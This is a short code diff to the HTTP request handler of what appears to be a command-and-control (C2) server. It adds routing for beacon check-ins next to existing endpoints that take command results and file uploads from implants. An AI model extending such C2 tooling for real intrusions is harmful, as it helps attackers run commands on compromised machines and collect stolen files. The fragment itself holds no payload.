@@ -123,7 +123,10 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         endpoint_type = self.path_router.get_endpoint_type(self.path)
         
         # Route to appropriate handler based on endpoint type
-        if endpoint_type in ["cmd_result_path", "previous_cmd_result_path", "old_cmd_result_path"]:
+        if endpoint_type in ["beacon_path", "previous_beacon_path", "old_beacon_path"]:
+            # Add this case to handle POST beacons
+            self._handle_beacon(include_rotation_info=(endpoint_type == "old_beacon_path"))
+        elif endpoint_type in ["cmd_result_path", "previous_cmd_result_path", "old_cmd_result_path"]:
             self._handle_result()
         elif endpoint_type in ["file_upload_path", "previous_file_upload_path", "old_file_upload_path"]:
             self._handle_file_upload()
